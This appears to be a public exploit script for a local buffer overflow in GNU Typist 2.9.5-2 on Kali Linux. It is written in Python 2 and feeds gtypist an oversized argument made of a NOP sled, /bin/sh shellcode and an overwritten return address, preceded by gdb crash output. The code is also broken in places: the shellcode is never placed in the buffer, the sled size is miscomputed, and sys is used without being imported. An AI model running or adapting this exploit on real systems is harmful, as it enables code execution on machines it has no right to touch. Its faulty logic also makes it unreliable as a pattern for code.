# Exploit developed using Exploit Pack v6.5
# Exploit Author: Juan Sacco - http://www.exploitpack.com -
# jsacco@exploitpack.com
# Program affected: GNU Typist
# Affected value: ARG0
# Version: 2.9.5-2
#
# Tested and developed under:  Kali Linux 2.0 x86 - https://www.kali.org
# Program description: Simple ncurses touch typing tutor
# Displays exercise lines, measures your typing speed and
# accuracy, and displays the results

# Kali Linux 2.0 package: pool/main/g/gtypist/gtypist_2.9.5-2_i386.deb
# MD5sum: 7ca59c5c0c494e41735b7be676401357
# Website: http://www.gnu.org/software/gtypist/

# gdb$ run `python -c 'print "A"*4098'`
# 0xb7e95def in __strcpy_chk () from /lib/i386-linux-gnu/libc.so.6
# 0x0804bf30 in ?? ()
# 0xb7dbb5f7 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
# 0x0804c393 in ?? ()


import os, subprocess

def run():
  try:
    print "# GNU GTypist - Local Buffer Overflow by Juan Sacco"
    print "# This Exploit has been developed using Exploit Pack -
http://exploitpack.com"
    # NOPSLED + SHELLCODE + EIP

    buffersize = 4098
    nopsled = "\x90"*30
    shellcode =
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    eip = "\x08\xec\xff\xbf"
    buffer = nopsled * (buffersize-len(shellcode)) + eip
    subprocess.call(["gtypist ",' ', buffer])

  except OSError as e:
    if e.errno == os.errno.ENOENT:
        print "Sorry, GNU GTypist - Not found!"
    else:
        print "Error executing exploit"
    raise

def howtousage():
  print "Snap! Something went wrong"
  sys.exit(-1)

if __name__ == '__main__':
  try:
    print "Exploit GNU GTypist -  Local Overflow Exploit"
    print "Author: Juan Sacco - Exploit Pack"
  except IndexError:
    howtousage()
run()
